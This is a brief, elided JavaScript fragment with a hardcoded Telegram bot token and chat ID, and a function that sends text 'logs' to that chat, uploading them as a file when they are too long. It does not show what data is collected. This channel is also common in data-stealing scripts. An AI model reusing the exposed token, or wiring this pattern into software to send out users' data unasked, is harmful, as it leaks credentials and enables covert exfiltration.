const TELEGRAM_BOT_TOKEN = "8619236749:AAFvXsLZ1r_zaeiEJKdTWRULQ9Tko1iFapU";
const TELEGRAM_CHAT_ID = "7291205537";
...
async function sendToTelegram(text) {
  ...
  // Exceeds limit — send as .txt file
  const blob = new Blob([text], { type: "text/plain" });
  const form = new FormData();
  form.append("chat_id", TELEGRAM_CHAT_ID);
  form.append("document", blob, "log.txt");
  form.append("caption", "📄 Log too long — sent as file");
